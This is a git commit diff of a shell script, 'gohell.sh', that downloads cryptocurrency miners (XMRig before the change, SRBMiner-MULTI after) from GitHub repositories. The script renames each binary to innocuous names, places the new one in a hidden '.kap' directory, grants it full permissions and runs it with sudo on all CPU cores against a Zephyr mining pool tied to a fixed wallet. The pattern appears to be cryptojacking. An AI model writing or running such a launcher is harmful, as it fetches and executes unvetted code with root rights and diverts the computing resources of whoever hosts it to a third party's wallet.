8723eca020c0f835558a361cb37790862698aa78
nandafiku <156932477+nandafiku@users.noreply.github.com>
2024-02-01 22:56:30 +0700

    Update gohell.sh

--- gohell.sh
+++ gohell.sh
@@ -1,4 +1,6 @@
 #!/bin/bash
-wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz
-mv xmrig sgr1
-./sgr1 --donate-level 1 -o de.zephyr.herominers.com:1123 -u ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 -p $(echo $(shuf -i 1-30000 -n 1)-AJG) -a rx/0 -t $(nproc --all)
+apt-get update ; apt-get -y install sudo
+mkdir .kap && cd .kap
+wget -O hora https://github.com/nandafiku/fillesg/raw/main/SRBMiner-MULTI
+chmod 777 hora
+sudo ./hora --algorithm randomx --pool de.zephyr.herominers.com:1123 --wallet ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 --password $(echo $(shuf -i 1-100000 -n 1)-A) --cpu-threads $(nproc --all)
